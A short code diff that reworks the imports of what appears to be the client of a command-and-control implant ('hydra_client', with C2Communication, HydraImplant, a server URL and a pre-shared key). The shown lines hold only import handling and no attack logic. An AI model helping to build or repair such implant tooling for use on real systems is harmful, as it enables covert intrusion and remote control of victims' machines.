@@ -2,13 +2,17 @@ import os
 import sys
 import asyncio
 
-# Add the parent directory to Python path when running directly
-if __name__ == "__main__":
-    sys.path.insert(0, os.path.abspath(os.path.dirname(os.path.dirname(__file__))))
-
-from network import C2Communication
-from implant import HydraImplant
-from config import *
+# Direct imports - no relative paths
+try:
+    from hydra_client.network import C2Communication
+    from hydra_client.implant import HydraImplant
+    from hydra_client.config import SERVER_URL, PSK
+except ImportError:
+    # Fallback for direct execution - add parent directory to path
+    sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))
+    from hydra_client.network import C2Communication
+    from hydra_client.implant import HydraImplant
+    from hydra_client.config import SERVER_URL, PSK
 
 async def main():
     # Initialize C2 communication
